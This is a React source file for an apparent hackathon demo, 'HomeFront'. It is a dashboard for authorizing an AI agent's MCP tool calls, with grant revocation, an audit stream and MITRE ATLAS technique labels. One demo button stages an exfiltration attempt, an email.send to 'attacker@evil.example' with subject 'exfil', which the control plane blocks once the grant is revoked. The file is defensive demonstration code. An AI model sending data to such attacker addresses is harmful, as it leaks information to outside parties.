import { useCallback, useEffect, useMemo, useState } from 'react'
import { api, type Agent, type AuditEvent, type Matrix, type Tool } from './api'
import './App.css'

type Flash = {
  kind: 'ok' | 'deny' | 'info'
  title: string
  body: string
  technique_ids?: string[]
  mitigation_ids?: string[]
} | null

const DEMO_AGENT = 'agent-comms-01'

export default function App() {
  const [agents, setAgents] = useState<Agent[]>([])
  const [tools, setTools] = useState<Tool[]>([])
  const [audit, setAudit] = useState<AuditEvent[]>([])
  const [matrix, setMatrix] = useState<Matrix | null>(null)
  const [token, setToken] = useState<string | null>(null)
  const [flash, setFlash] = useState<Flash>(null)
  const [busy, setBusy] = useState(false)
  const [lastResult, setLastResult] = useState<unknown>(null)
  const [atlasVersion, setAtlasVersion] = useState<string>('')

  const agent = useMemo(
    () => agents.find((a) => a.agent_id === DEMO_AGENT) || agents[0],
    [agents],
  )

  const refresh = useCallback(async () => {
    const [a, t, au, m] = await Promise.all([
      api.agents(),
      api.tools(),
      api.audit(),
      api.matrix(),
    ])
    setAgents(a)
    setTools(t)
    setAudit(au)
    setMatrix(m)
    setAtlasVersion(m.atlas_version)
  }, [])

  useEffect(() => {
    refresh().catch((e) =>
      setFlash({
        kind: 'deny',
        title: 'Gateway unreachable',
        body: String(e.message || e),
      }),
    )
    const id = window.setInterval(() => {
      api.audit().then(setAudit).catch(() => {})
      api.agents().then(setAgents).catch(() => {})
    }, 2500)
    return () => window.clearInterval(id)
  }, [refresh])

  async function authenticate() {
    if (!agent) return
    setBusy(true)
    try {
      const res = await api.auth(agent.agent_id)
      setToken(res.access_token)
      setFlash({
        kind: 'ok',
        title: 'Agent authenticated',
        body: res.atlas.narrative,
        mitigation_ids: ['AML.M0028', 'AML.M0024'],
      })
      await refresh()
    } catch (e) {
      setFlash({ kind: 'deny', title: 'Auth failed', body: String(e) })
    } finally {
      setBusy(false)
    }
  }

  async function runTool(tool: string, args: Record<string, unknown>) {
    if (!token) {
      setFlash({ kind: 'info', title: 'Authenticate first', body: 'Issue a workload token before calling tools.' })
      return
    }
    setBusy(true)
    try {
      const res = await api.callTool(token, tool, args)
      setLastResult(res.result)
      setFlash({
        kind: 'ok',
        title: `Allowed ${tool}`,
        body: res.atlas.narrative,
        technique_ids: res.atlas.technique_ids,
        mitigation_ids: res.atlas.mitigation_ids,
      })
      await refresh()
    } catch (e: unknown) {
      const err = e as { data?: { detail?: unknown }; message?: string }
      const detail = err.data && typeof err.data === 'object' ? (err.data as { detail?: unknown }).detail : null
      const atlas =
        detail && typeof detail === 'object'
          ? (detail as { atlas?: { narrative?: string; technique_ids?: string[]; mitigation_ids?: string[] }; message?: string })
          : null
      setLastResult(detail)
      setFlash({
        kind: 'deny',
        title: atlas?.message || `Denied ${tool}`,
        body: atlas?.atlas?.narrative || err.message || 'Request blocked',
        technique_ids: atlas?.atlas?.technique_ids,
        mitigation_ids: atlas?.atlas?.mitigation_ids,
      })
      await refresh()
    } finally {
      setBusy(false)
    }
  }

  async function revoke(tool: string) {
    if (!agent) return
    setBusy(true)
    try {
      const res = await api.revoke(agent.agent_id, tool)
      setFlash({
        kind: 'info',
        title: `Revoked ${tool}`,
        body: res.message,
        technique_ids: res.atlas.technique_ids,
        mitigation_ids: res.atlas.mitigation_ids,
      })
      await refresh()
    } catch (e) {
      setFlash({ kind: 'deny', title: 'Revoke failed', body: String(e) })
    } finally {
      setBusy(false)
    }
  }

  async function restore(tool: string) {
    if (!agent) return
    setBusy(true)
    try {
      await api.grant(agent.agent_id, tool)
      setFlash({
        kind: 'ok',
        title: `Restored ${tool}`,
        body: 'Grant re-added under AML.M0028.',
        mitigation_ids: ['AML.M0028'],
      })
      await refresh()
    } finally {
      setBusy(false)
    }
  }

  return (
    <div className="shell">
      <header className="top">
        <div className="brand-block">
          <p className="eyebrow">AWS × A10 Hackathon · Prompt 1</p>
          <h1>HomeFront</h1>
          <p className="tagline">
            Agentic identity with MITRE ATLAS-tagged MCP authorization
          </p>
        </div>
        <div className="meta">
          <span className="pill">ATLAS {atlasVersion || '…'}</span>
          <span className={`pill ${token ? 'on' : ''}`}>
            {token ? 'Token live' : 'Unauthenticated'}
          </span>
        </div>
      </header>

      {flash && (
        <div className={`flash flash-${flash.kind}`} role="status">
          <strong>{flash.title}</strong>
          <p>{flash.body}</p>
          <div className="id-row">
            {(flash.technique_ids || []).map((id) => (
              <code key={id} className="tech">
                {id}
              </code>
            ))}
            {(flash.mitigation_ids || []).map((id) => (
              <code key={id} className="mit">
                {id}
              </code>
            ))}
          </div>
        </div>
      )}

      <div className="grid">
        <section className="panel identity">
          <h2>Workload identity</h2>
          {agent ? (
            <>
              <dl>
                <div>
                  <dt>Agent</dt>
                  <dd>{agent.name}</dd>
                </div>
                <div>
                  <dt>Agency</dt>
                  <dd>{agent.agency}</dd>
                </div>
                <div>
                  <dt>ID</dt>
                  <dd>
                    <code>{agent.agent_id}</code>
                  </dd>
                </div>
                <div>
                  <dt>Token version</dt>
                  <dd>{agent.token_version}</dd>
                </div>
              </dl>
              <button className="primary" disabled={busy} onClick={authenticate}>
                Authenticate agent
              </button>
              <h3>Tool grants</h3>
              <ul className="grants">
                {tools.map((t) => {
                  const granted = agent.tool_grants.includes(t.name)
                  return (
                    <li key={t.name}>
                      <div>
                        <code>{t.name}</code>
                        <span className={`risk risk-${t.risk_level}`}>{t.risk_level}</span>
                        <p>{t.description}</p>
                        <div className="id-row compact">
                          {t.atlas_techniques.map((id) => (
                            <code key={id} className="tech">
                              {id}
                            </code>
                          ))}
                        </div>
                      </div>
                      <div className="grant-actions">
                        <span className={granted ? 'yes' : 'no'}>
                          {granted ? 'granted' : 'revoked'}
                        </span>
                        {granted ? (
                          <button disabled={busy} onClick={() => revoke(t.name)}>
                            Revoke
                          </button>
                        ) : (
                          <button disabled={busy} onClick={() => restore(t.name)}>
                            Restore
                          </button>
                        )}
                      </div>
                    </li>
                  )
                })}
              </ul>
            </>
          ) : (
            <p>Loading agent…</p>
          )}
        </section>

        <section className="panel actions">
          <h2>Agent task (MCP calls)</h2>
          <p className="hint">
            Demo path: scrape → send email → revoke <code>email.send</code> → retry (blocked as{' '}
            <code>AML.T0053</code>).
          </p>
          <div className="action-row">
            <button
              disabled={busy || !token}
              onClick={() =>
                runTool('web.scrape', { url: 'https://www.usa.gov' })
              }
            >
              1. web.scrape
            </button>
            <button
              disabled={busy || !token}
              onClick={() =>
                runTool('datagov.search', { q: 'public health' })
              }
            >
              2. datagov.search
            </button>
            <button
              className="primary"
              disabled={busy || !token}
              onClick={() =>
                runTool('email.send', {
                  to: 'constituent@example.gov',
                  subject: 'Town hall reminder',
                  body: 'Join us Tuesday at City Hall.',
                })
              }
            >
              3. email.send
            </button>
            <button
              className="danger"
              disabled={busy || !agent}
              onClick={() => revoke('email.send')}
            >
              4. Revoke email.send
            </button>
            <button
              disabled={busy || !token}
              onClick={() =>
                runTool('email.send', {
                  to: 'attacker@evil.example',
                  subject: 'exfil',
                  body: 'should be blocked',
                })
              }
            >
              5. Retry email.send
            </button>
          </div>
          <h3>Last tool result</h3>
          <pre className="result">{JSON.stringify(lastResult, null, 2) || '—'}</pre>
        </section>

        <aside className="panel atlas">
          <h2>ATLAS Agentic strip</h2>
          <p className="hint">
            Techniques the control plane is defending; mitigations HomeFront labels in audit.
          </p>
          <h3>Techniques</h3>
          <ul className="matrix-list">
            {(matrix?.techniques || []).map((t) => (
              <li key={t.id}>
                <code className="tech">{t.id}</code>
                <span>{t.name || '—'}</span>
              </li>
            ))}
          </ul>
          <h3>Mitigations</h3>
          <ul className="matrix-list">
            {(matrix?.mitigations || []).map((m) => (
              <li key={m.id}>
                <code className="mit">{m.id}</code>
                <span>{m.name || '—'}</span>
              </li>
            ))}
          </ul>
        </aside>

        <section className="panel audit">
          <h2>Audit stream · AML.M0024</h2>
          <ul className="audit-list">
            {audit.map((ev) => (
              <li key={ev.id} className={`dec-${ev.decision}`}>
                <div className="audit-head">
                  <span className="decision">{ev.decision}</span>
                  <span>{ev.type}</span>
                  <code>{ev.tool || '—'}</code>
                  <time>{new Date(ev.ts * 1000).toLocaleTimeString()}</time>
                </div>
                <p>{ev.atlas?.narrative}</p>
                <div className="id-row compact">
                  {(ev.atlas?.technique_ids || []).map((id) => (
                    <code key={id} className="tech">
                      {id}
                    </code>
                  ))}
                  {(ev.atlas?.mitigation_ids || []).map((id) => (
                    <code key={id} className="mit">
                      {id}
                    </code>
                  ))}
                </div>
              </li>
            ))}
            {audit.length === 0 && <li>No events yet — authenticate to begin.</li>}
          </ul>
        </section>
      </div>
    </div>
  )
}
